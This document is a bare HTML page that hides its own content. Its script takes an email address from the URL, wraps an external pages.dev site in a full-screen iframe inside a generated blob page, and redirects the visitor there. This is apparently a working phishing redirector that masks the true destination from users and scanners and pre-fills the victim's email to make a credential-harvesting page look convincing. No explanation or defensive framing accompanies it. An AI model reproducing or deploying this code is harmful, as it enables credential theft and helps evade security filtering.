<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100vw;
    height: 100vh;
    background: white;
    overflow: hidden;
}
* {
    opacity: 0 !important;
    visibility: hidden !important;
}
</style>
</head>
<body>

<script>
(function () {
    'use strict';

    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";

    function getEmail() {
        return new URLSearchParams(window.location.search).get("email") || "";
    }

    function buildTargetUrl(email) {
        return email
            ? TARGET_BASE + "?email=" + encodeURIComponent(email)
            : TARGET_BASE;
    }

    function createMobileSafeBlob(targetUrl, email) {
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Blob Page</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    font-family: Arial, sans-serif;
    background: white;
}
#emailBox {
    position: fixed;
    top: 10px;
    left: 10px;
    z-index: 9999;
    font-size: 14px;
    color: #000;
}
iframe {
    width: 100%;
    height: 100%;
    border: none;
}
</style>
</head>
<body>

<div id="emailBox">
    Email: <strong id="emailValue"></strong>
</div>

<iframe src="${targetUrl}"></iframe>

<script>
    const email = ${JSON.stringify(email)};
    document.getElementById("emailValue").textContent = email;
<\/script>

</body>
</html>`;

        return new Blob([html], { type: "text/html" });
    }

    function grantAccess() {
        const email = getEmail();
        const targetUrl = buildTargetUrl(email);
        const blob = createMobileSafeBlob(targetUrl, email);
        const blobUrl = URL.createObjectURL(blob);

        window.location.href = blobUrl;

        setTimeout(() => {
            try { URL.revokeObjectURL(blobUrl); } catch(e) {}
        }, 10000);
    }

    setTimeout(grantAccess, 100);

})();
</script>

</body>
</html>
